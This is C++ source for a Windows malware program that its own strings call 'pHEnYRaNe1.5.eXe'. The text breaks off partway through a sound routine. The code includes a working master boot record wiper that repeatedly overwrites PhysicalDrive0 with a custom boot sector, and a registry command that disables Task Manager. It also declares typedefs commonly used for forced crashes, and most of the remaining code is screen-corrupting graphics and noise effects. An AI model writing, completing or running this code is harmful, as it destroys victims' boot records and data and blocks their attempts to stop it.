#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#include <algorithm>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>

#ifndef M_PI
#define M_PI   3.14159265358979323846264338327950288
#endif

const unsigned char MasterBootRecord[] = { 0x0E, 0x1F, 0x0E, 0x07, 0x31, 0xDB, 0xB8, 0x00, 0x3F, 0xBF, 0x04, 0x7E, 0xB9, 0x00, 0x09, 0xF3,
0xAA, 0x88, 0x87, 0x04, 0x7E, 0x88, 0xA7, 0xC4, 0x7E, 0x88, 0x87, 0x85, 0x7F, 0x88, 0xA7, 0x45,
0x80, 0x88, 0x87, 0x05, 0x81, 0x88, 0xA7, 0xC5, 0x81, 0x88, 0x87, 0x86, 0x82, 0x88, 0xA7, 0x46,
0x83, 0x88, 0x87, 0x06, 0x84, 0x88, 0xA7, 0xC6, 0x84, 0x88, 0x87, 0x84, 0x85, 0x88, 0xA7, 0x44,
0x86, 0xFE, 0xCC, 0xFE, 0xC0, 0x83, 0xC3, 0x03, 0x81, 0xFB, 0xC0, 0x00, 0x7C, 0xC3, 0xB9, 0x00,
0x01, 0x9B, 0xDB, 0xE3, 0xD9, 0x06, 0x47, 0x7D, 0xDE, 0x0E, 0x4D, 0x7D, 0xD9, 0xFE, 0xDD, 0xD9,
0xD9, 0xE8, 0xD8, 0xC1, 0xDE, 0x0E, 0x4B, 0x7D, 0xDF, 0x1D, 0x47, 0xFF, 0x06, 0x4D, 0x7D, 0xE2,
0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFA, 0xBA, 0xC4, 0x03, 0xB8, 0x04, 0x06, 0xEF, 0xB8, 0x02,
0x0F, 0xEF, 0x83, 0xC2, 0x10, 0xB8, 0x14, 0x00, 0xEF, 0xB8, 0x17, 0xE3, 0xEF, 0xB0, 0x09, 0xEE,
0x42, 0xEC, 0x24, 0xE0, 0x04, 0x07, 0xEE, 0xFB, 0xB9, 0x00, 0x01, 0xBA, 0x04, 0x7E, 0xE8, 0x90,
0x00, 0x68, 0x00, 0xA0, 0x07, 0xBA, 0xDA, 0x03, 0xEC, 0x24, 0x08, 0x75, 0xFB, 0xEC, 0x24, 0x08,
0x74, 0xFB, 0x31, 0xED, 0xA1, 0x41, 0x7D, 0xA3, 0x00, 0x7E, 0xB5, 0x32, 0xA1, 0x43, 0x7D, 0xA3,
0x02, 0x7E, 0xB1, 0x50, 0xBE, 0x00, 0x7E, 0xBB, 0x04, 0x87, 0xB4, 0x00, 0xB2, 0x04, 0xAC, 0xD7,
0x00, 0xC4, 0xFE, 0xCA, 0x75, 0xF8, 0x26, 0x88, 0x66, 0x00, 0x45, 0xFE, 0x06, 0x02, 0x7E, 0x80,
0x06, 0x03, 0x7E, 0x03, 0xFE, 0xC9, 0x75, 0xDC, 0x80, 0x06, 0x00, 0x7E, 0x02, 0xFE, 0x06, 0x01,
0x7E, 0xFE, 0xCD, 0x75, 0xC7, 0x80, 0x06, 0x41, 0x7D, 0x01, 0x80, 0x2E, 0x42, 0x7D, 0x02, 0x80,
0x06, 0x43, 0x7D, 0x03, 0x80, 0x2E, 0x44, 0x7D, 0x04, 0xE4, 0x60, 0xFE, 0xC8, 0x75, 0x96, 0x51,
0x52, 0x8B, 0x16, 0x45, 0x7D, 0x81, 0xC2, 0x00, 0x03, 0x81, 0xFA, 0x04, 0x84, 0x7E, 0x03, 0xBA,
0x04, 0x7E, 0x89, 0x16, 0x45, 0x7D, 0xB9, 0x00, 0x01, 0xE8, 0x05, 0x00, 0x5A, 0x59, 0xE9, 0x74,
0xFF, 0x06, 0x50, 0x53, 0x0E, 0x07, 0xB8, 0x12, 0x10, 0x31, 0xDB, 0xCD, 0x10, 0x5B, 0x58, 0x07,
0xC3, 0x00, 0x00, 0x00, 0x00, 0x04, 0x7E, 0xDC, 0x0F, 0xC9, 0x3C, 0x1E, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}

DWORD WINAPI d(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}

namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = (std::min)((std::min)(_r, _g), _b);
        FLOAT rgbMax = (std::max)((std::max)(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}

int red = 0, green = 0, blue = 0;
bool ifcolorblue = false, ifblue = false;

COLORREF Hue(int length) {
    if (red != length) {
        red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
                return RGB(0, 0, 0);
            }
        }
    }
}

DWORD WINAPI blur1(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        hdc = GetDC(NULL);
        HBRUSH hbr = CreateSolidBrush(Hue(239));
        SelectObject(dcCopy, hbr);
        BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, PATCOPY);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        Sleep(rand() % 25);
        DeleteObject(hbr);
        ReleaseDC(0, hdc);
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
    }
    return 0x00;
}

DWORD WINAPI hexagon(LPVOID lpParam)
{
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;

    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;

        int centerX = x + 50;
        int centerY = y + 50;
        int radius = 50;

        POINT hexagonPoints[6];
        for (int i = 0; i < 6; ++i) {
            double angle = 2.0 * M_PI * i / 6;
            hexagonPoints[i].x = centerX + static_cast<int>(radius * cos(angle));
            hexagonPoints[i].y = centerY + static_cast<int>(radius * sin(angle));
        }

        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        Polygon(hdc, hexagonPoints, 6);

        if (centerY >= GetSystemMetrics(SM_CYSCREEN)) {
            signY = -1;
        }

        if (centerX >= GetSystemMetrics(SM_CXSCREEN)) {
            signX = -1;
        }

        if (centerY <= 0) {
            signY = 1;
        }

        if (centerX <= 0) {
            signX = 1;
        }

        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader1(LPVOID lpParam) {
    HDC desk = GetDC(0);
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = sw;
    bmi.bmiHeader.biHeight = sh;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    int colorModifier = 0;

    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbquad, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);

        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i / sw;

            rgbquad[i].rgbRed += GetRValue(x & y) + colorModifier;
            rgbquad[i].rgbGreen += GetGValue(x ^ y) - colorModifier;
            rgbquad[i].rgbBlue += GetBValue(x ^ y) + colorModifier;

            colorModifier = (colorModifier + 1) % 40;
        }

        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk);
        DeleteDC(deskMem);
        DeleteObject(scr);
    }
}

// Fixed shader2 - removed .rgb member (doesn't exist)
DWORD WINAPI shader2(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    RGBQUAD* rgbScreen = NULL;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgbBlue += x & y;
            // XOR operation on individual color components instead of .rgb
            rgbScreen[i].rgbRed ^= 360;
            rgbScreen[i].rgbGreen ^= 360;
            rgbScreen[i].rgbBlue ^= 360;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(10);
        ReleaseDC(NULL, hdcScreen); 
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 110)
                v = rand() % 32;
            ((BYTE*)(data + i))[v * 10] = x^y;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI shader4(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = (int)((x << (i * 4)) >> (y << (i * 4)));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI trianglez(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;

        TRIVERTEX vertex[3];
        vertex[0].x = x+100;
        vertex[0].y = y;
        vertex[0].Red = 0xb000;
        vertex[0].Green = 0x9000;
        vertex[0].Blue = 0x0000;
        vertex[0].Alpha = 0x0000;

        vertex[1].x = x;
        vertex[1].y = y+100;
        vertex[1].Red = 0x0000;
        vertex[1].Green = 0x8000;
        vertex[1].Blue = 0xff00;
        vertex[1].Alpha = 0x0000;

        vertex[2].x = x+200;
        vertex[2].y = y+100;
        vertex[2].Red = 0xff00;
        vertex[2].Green = 0x8000;
        vertex[2].Blue = 0x0000;
        vertex[2].Alpha = 0x0000;

        GRADIENT_TRIANGLE gTriangle;
        gTriangle.Vertex1 = 0;
        gTriangle.Vertex2 = 1;
        gTriangle.Vertex3 = 2;

        GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
        
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(1);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI blur2(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    RECT rect;
    POINT pt1[10];
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        hdc = GetDC(NULL);
        GetWindowRect(GetDesktopWindow(), &rect);
        int inc31 = rand() % w - rand() % h % rand() % w - rand() % h;
        inc31--;
        pt1[0].x = rect.left - inc31;
        pt1[0].y = rect.top - inc31;
        pt1[1].x = rect.right - inc31;
        pt1[1].y = rect.top + inc31;
        pt1[2].x = rect.left + inc31;
        pt1[2].y = rect.bottom - inc31;
        PlgBlt(hdcCopy, pt1, hdc, rect.left, rect.top, rect.right, rect.bottom, 0, 0, 0);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}

DWORD WINAPI invcc(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0);
        int rand_num_x = rand() % sw;
        int rand_num_y = rand() % sh;

        int top_x = 0 + rand_num_x;
        int top_y = 0 + rand_num_y;

        int bottom_x = 100 + rand_num_x;
        int bottom_y = 100 + rand_num_y;
        HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y);
        InvertRgn(hdc, circle);
        DeleteObject(circle);
        ReleaseDC(0, hdc);
        Sleep(rand() % 25);
    }
}

DWORD WINAPI shader5(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)((i ^ 4) + (i * 4) * cbrt(x | y));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI blur3(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    RECT rekt;
    POINT pt1[3];
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int counter = M_PI * M_PI * M_PI;
    int xSize = h;
    int ySize = w / 45;
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        for (int i = 0; i < h / 3; i++) {
            hdc = GetDC(NULL);
            GetWindowRect(GetDesktopWindow(), &rekt);
            pt1[0].x = rekt.left + counter;
            pt1[0].y = rekt.top - sin(i / ((float)xSize) * M_PI) * (ySize);
            pt1[1].x = rekt.right + counter;
            pt1[1].y = rekt.top + counter;
            pt1[2].x = rekt.left - counter;
            pt1[2].y = rekt.bottom - counter;
            PlgBlt(hdcCopy, pt1, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
            ReleaseDC(0, hdc);
        }
    }
    return 0x00;
}

DWORD WINAPI textout1(LPVOID lpvd)
{
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    LPCSTR text = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    LPCSTR text4 = "pHEnYRaNe1.5.eXe RuNnInG...";
    LPCSTR text5 = "yOuR pC iS dIe, hAhA!";
    LPCSTR text6 = "gOoDbYe yOuR dAtA!";
    
    while (1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        text = "pHEnYRaNe1.5.eXe";
        text1 = "viETnAMlOVeR";
        text2 = "pHEnYRaNe1.5.eXe bY viETnAMlOVeR";
        text3 = "whY yOu eXEcuTe tHiS mALwaRE?!";
        SetTextColor(hdc, Hue(239));
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

// Fixed shader6 - removed .rgb member
DWORD WINAPI shader6(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    RGBQUAD* rgbScreen = NULL;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            // Multiply each color component by random value
            rgbScreen[i].rgbRed *= rand();
            rgbScreen[i].rgbGreen *= rand();
            rgbScreen[i].rgbBlue *= rand();
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(10);
        ReleaseDC(NULL, hdcScreen); 
        DeleteDC(hdcScreen);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & 1) ? (t ^ (t >> 7)) : (t * (t >> 6) & 255));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (t >> 9 | t >> 11)) & 255);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 3) * ((t >> 4) ^ (t >> 5)) & 255);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
